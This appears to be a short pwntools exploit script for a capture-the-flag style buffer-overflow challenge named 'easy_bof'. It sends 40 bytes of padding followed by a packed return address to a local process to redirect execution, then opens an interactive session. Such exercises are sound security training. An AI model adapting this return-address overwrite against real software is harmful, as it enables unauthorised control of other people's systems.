from pwn import *
target_address = p64(0x4005C7) 
garbage =  b'a'*(28+4+8) 
msgin = garbage + target_address 
p = process('./easy_bof') 
p.sendline(msgin) 
p.interactive()